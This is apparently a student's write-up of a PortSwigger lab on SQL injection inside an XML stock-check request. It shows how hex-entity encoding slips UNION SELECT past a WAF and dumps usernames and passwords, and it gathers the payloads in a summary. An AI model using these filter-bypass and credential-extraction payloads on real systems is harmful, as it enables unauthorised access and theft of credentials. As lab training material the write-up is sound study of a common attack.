## 🔗 Lab Link
https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

# 🛡️ Lab: SQL Injection with Filter Bypass via XML Encoding

## 📌 Platform

* PortSwigger Web Security Academy

---

## 🎯 Objective

Exploit an SQL injection vulnerability in an XML-based request to extract user credentials and log in as the administrator.

---

## 🔍 Vulnerability Overview

The application uses an XML request to check product stock:

```xml
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

The `storeId` parameter is vulnerable to **SQL Injection**, but protected by a **Web Application Firewall (WAF)** that blocks common SQL keywords.

---

## 🧪 Step 1: Identify Injection Point

Intercept the request using Burp Suite and send it to Repeater.

Test for injection using a mathematical expression:

```xml
<storeId>1+1</storeId>
```

### ✅ Observation:

* Response changes → confirms input is evaluated by backend
* Indicates **SQL Injection is possible**

---

## 🚫 Step 2: Initial Injection Attempt (Blocked)

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

### ❌ Result:

* Response: `403 Forbidden - Attack detected`

### 🧠 Reason:

* WAF detects keywords like `UNION`, `SELECT`

---

## 🔐 Step 3: Bypass WAF using XML Encoding

Use XML entity encoding to obfuscate payload.

Example using Hackvertor:

```xml
<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
```

### ✅ Result:

* Request is no longer blocked
* WAF bypass successful

---

## 🧮 Step 4: Determine Number of Columns

Test with:

```xml
<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
```

### ✅ Observation:

* Works → indicates query returns **1 column only**

---

## 💥 Step 5: Extract Data (Single Column Constraint)

Since only one column is returned, concatenate values:

```xml
<storeId>
<@hex_entities>
1 UNION SELECT username || '~' || password FROM users
</@hex_entities>
</storeId>
```

### ✅ Result:

* Response contains:

```
administrator~password123
```

---

## 🔓 Step 6: Login as Administrator

* Extract credentials from response
* Login using:

  * Username: `administrator`
  * Password: extracted value

✅ Lab solved

---

## 🧠 Key Learnings

* XML input can be vulnerable to SQL injection
* WAFs can be bypassed using encoding techniques
* Always test input evaluation using arithmetic expressions
* Column count is critical in UNION-based SQLi
* Data can be extracted using concatenation when limited to one column

---

## 🛠️ Tools Used

* Burp Suite (Proxy, Repeater)
* Hackvertor (for encoding payloads)

---

## 🚀 Payload Summary

### Basic Injection Test

```xml
<storeId>1+1</storeId>
```

### WAF Bypass

```xml
<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
```

### Data Extraction

```xml
<storeId>
<@hex_entities>
1 UNION SELECT username || '~' || password FROM users
</@hex_entities>
</storeId>
```

---

## 📌 Conclusion

This lab demonstrates how attackers can:

* Exploit SQL injection in XML inputs
* Bypass WAF protections using encoding
* Adapt payloads based on query structure
* Extract sensitive data even with constraints

---
